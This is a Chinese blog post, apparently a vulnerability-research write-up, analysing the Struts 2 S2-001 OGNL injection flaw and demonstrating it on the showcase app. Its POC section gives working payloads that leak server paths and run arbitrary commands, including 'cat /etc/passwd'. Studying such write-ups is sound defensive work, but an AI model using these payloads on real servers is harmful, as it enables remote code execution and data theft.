@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Struts 2,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="转自&amp;nbsp;王小龍的博客 漏洞原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Struts&amp;nbsp;2&amp;nbsp;框架的表单验证机制（&amp;nbsp;Validation&amp;nbsp;）主要依赖于两个拦截器：validation&amp;nbsp;和&amp;nbsp;workflow。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validation&amp;nbsp;拦截器工作时，会根据&amp;nbsp;XML&amp;n">
+<meta name="keywords" content="Struts 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts 2 漏洞系列之 S2-001">
+<meta property="og:url" content="http://blog.bruce.wang/2017/12/01/Struts 2 漏洞系列之 S2-001/index.html">
+<meta property="og:site_name" content="BruceWang&#39;s Blog">
+<meta property="og:description" content="转自&amp;nbsp;王小龍的博客 漏洞原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Struts&amp;nbsp;2&amp;nbsp;框架的表单验证机制（&amp;nbsp;Validation&amp;nbsp;）主要依赖于两个拦截器：validation&amp;nbsp;和&amp;nbsp;workflow。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validation&amp;nbsp;拦截器工作时，会根据&amp;nbsp;XML&amp;n">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7053164-5ff9bd5a4dca0cd5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7053164-040a84c2725c327b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7053164-a0e6f8d3f63a314b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7053164-e145aa599a14ace0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/7053164-e5d8cf4514e8410d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2017-12-19T14:45:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Struts 2 漏洞系列之 S2-001">
+<meta name="twitter:description" content="转自&amp;nbsp;王小龍的博客 漏洞原理&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Struts&amp;nbsp;2&amp;nbsp;框架的表单验证机制（&amp;nbsp;Validation&amp;nbsp;）主要依赖于两个拦截器：validation&amp;nbsp;和&amp;nbsp;workflow。 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;validation&amp;nbsp;拦截器工作时，会根据&amp;nbsp;XML&amp;n">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/7053164-5ff9bd5a4dca0cd5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blog.bruce.wang/2017/12/01/Struts 2 漏洞系列之 S2-001/">
+
+
+
+
+
+  <title>Struts 2 漏洞系列之 S2-001 | BruceWang's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BruceWang's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">王小龍的博客</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.bruce.wang/2017/12/01/Struts 2 漏洞系列之 S2-001/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="BruceWang">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BruceWang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Struts 2 漏洞系列之 S2-001</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-01T11:11:11+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞研究/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞研究</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>转自&nbsp;<a href="http://bruce.wang" target="_blank" rel="noopener">王小龍的博客</a></p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;Struts&nbsp;2&nbsp;框架的表单验证机制（&nbsp;Validation&nbsp;）主要依赖于两个拦截器：<code>validation</code>&nbsp;和&nbsp;<code>workflow</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>validation</code>&nbsp;拦截器工作时，会根据&nbsp;XML&nbsp;配置文件来创建一个验证错误列表；<code>workflow</code>&nbsp;拦截器工作时，会根据&nbsp;<code>validation</code>&nbsp;拦截器所提供的验证错误列表，来检查当前所提交的表单是否存在验证错误。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;在默认配置下，如果&nbsp;<code>workflow</code>&nbsp;拦截器检测到用户所提交的表单存在任何一个验证错误，<code>workflow</code>&nbsp;拦截器都会将用户的输入进行解析处理，随即返回并显示处理结果。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;那么问题出在哪里呢？我们再来了解&nbsp;Struts&nbsp;2&nbsp;框架中的一个标签处理功能：&nbsp;<code>altSyntax</code>。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>altSyntax</code>&nbsp;功能是&nbsp;Struts&nbsp;2&nbsp;框架用于处理标签内容的一种新语法（不同于普通的&nbsp;HTML&nbsp;），该功能主要作用在于支持对标签中的&nbsp;OGNL&nbsp;表达式进行解析并执行。比如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:iterator</span> <span class="attr">value</span>=<span class="string">"cart.items"</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">   <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"'Cart item No.' + #rowstatus.index + ' note'"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">name</span>=<span class="string">"'cart.items[' + #rowstatus.index + '].note'"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">value</span>=<span class="string">"note"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:iterator</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;上述代码在开启&nbsp;<code>altSyntax</code>&nbsp;功能后，可以这么写（引入&nbsp;OGNL&nbsp;表达式）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:iterator</span> <span class="attr">value</span>=<span class="string">"cart.items"</span>&gt;</span></span><br><span class="line">   ...</span><br><span class="line">   <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Cart item No. %&#123;#rowstatus.index&#125; note"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">name</span>=<span class="string">"cart.items[%&#123;#rowstatus.index&#125;].note"</span></span></span><br><span class="line"><span class="tag">                 <span class="attr">value</span>=<span class="string">"%&#123;note&#125;"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:iterator</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>altSyntax</code>&nbsp;功能在处理标签时，对&nbsp;OGNL&nbsp;表达式的解析能力实际上是依赖于开源组件&nbsp;XWork。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;于是，在&nbsp;XWork&nbsp;组件版本小于&nbsp;2.0.4&nbsp;以及&nbsp;<code>altSyntax</code>&nbsp;功能开启的情况下，恶意攻击者可以通过提交一个带有&nbsp;OGNL&nbsp;表达式的表单请求，故意触发表单验证错误——最终该表单请求中恶意的&nbsp;OGNL&nbsp;表达式会被&nbsp;XWork&nbsp;组件解析并执行，随即由&nbsp;<code>workflow</code>&nbsp;拦截器返回执行结果。</p>
+<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本次测试我们使用的代码是官方提供的&nbsp;<code>struts2-showcase-2.0.1</code>，&nbsp;XWork&nbsp;版本小于&nbsp;<code>2.0.4</code>，且&nbsp;<code>altSyntax</code>&nbsp;功能默认是开启的，无需再手动配置。</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;测试&nbsp;Demo&nbsp;表单中一共有三个值：<code>name</code>、<code>age</code>&nbsp;和&nbsp;<code>answer</code>。表单代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s:form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Name"</span> <span class="attr">name</span>=<span class="string">"name"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Age"</span> <span class="attr">name</span>=<span class="string">"age"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:textfield</span> <span class="attr">label</span>=<span class="string">"Favorite color"</span> <span class="attr">name</span>=<span class="string">"answer"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">s:submit</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">s:form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<code>validation</code>&nbsp;拦截器设置的条件是&nbsp;<code>age</code>&nbsp;的值必须在13和19之间，配置信息如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"requiredstring"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>You must enter a name<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>13<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>19<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span>&gt;</span>Only people ages 13 to 19 may take this quiz<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;测试&nbsp;Demo&nbsp;界面效果图如下：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-5ff9bd5a4dca0cd5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="S2-001 DEMO"></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;现在我们来模拟恶意用户：</p>
+<ul>
+<li>1.&nbsp;POST&nbsp;提交正常数据：<code>name=test&amp;age=14&amp;answer=black</code>，回显正常。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-040a84c2725c327b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>2.&nbsp;POST&nbsp;提交触发验证错误的正常数据：<code>name=test&amp;age=10&amp;answer=black</code>，回显输入内容并提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-a0e6f8d3f63a314b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>3.&nbsp;POST&nbsp;提交特殊构造的恶意数据：<code>name=%{11+12}&amp;age=10&amp;answer=%{2017+2018}</code>，回显恶意&nbsp;OGNL&nbsp;表达式的执行结果，并提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-e145aa599a14ace0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<ul>
+<li>4.&nbsp;POST&nbsp;提交攻击代码：<code>name=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}&amp;age=10&amp;answer=%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code>，回显攻击代码的执行结果，镔铁提示触发了表单验证错误。效果如下：</li>
+</ul>
+<p><img src="http://upload-images.jianshu.io/upload_images/7053164-e5d8cf4514e8410d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="测试"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本文所提供的&nbsp;POC&nbsp;仅供研究学习，请勿用于非法用途！</p>
+<ul>
+<li>获取tomcat执行路径：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取Web路径：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">  #req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">  #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),</span><br><span class="line">  #response.println(#req.getRealPath('/')),</span><br><span class="line">  #response.flush(),</span><br><span class="line">  #response.close()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行任意命令:</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"whoami"&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行任意命令时，如果所执行的命令需要组合，则将上述&nbsp;payload&nbsp;改为：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"cat","/etc/passwd"&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="挖洞思路"><a href="#挖洞思路" class="headerlink" title="挖洞思路"></a>挖洞思路</h2><ul>
+<li>需要了解&nbsp;Struts&nbsp;2&nbsp;框架的表单验证机制。</li>
+<li>需要了解&nbsp;OGNL&nbsp;表达式。</li>
+</ul>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li>官方的&nbsp;<a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">漏洞链接</a>。</li>
+<li>开源&nbsp;<a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">payload</a>&nbsp;提供者。</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Struts-2/" rel="tag"># Struts 2</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/03/2017年乌镇互联网大会嘉宾分享要点实录/" rel="prev" title="2017年乌镇互联网大会嘉宾分享要点实录">
+                2017年乌镇互联网大会嘉宾分享要点实录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">BruceWang</p>
+              <p class="site-description motion-element" itemprop="description">filtering noise and focusing on threats</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞演示"><span class="nav-number">2.</span> <span class="nav-text">漏洞演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">3.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#挖洞思路"><span class="nav-number">4.</span> <span class="nav-text">挖洞思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BruceWang</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
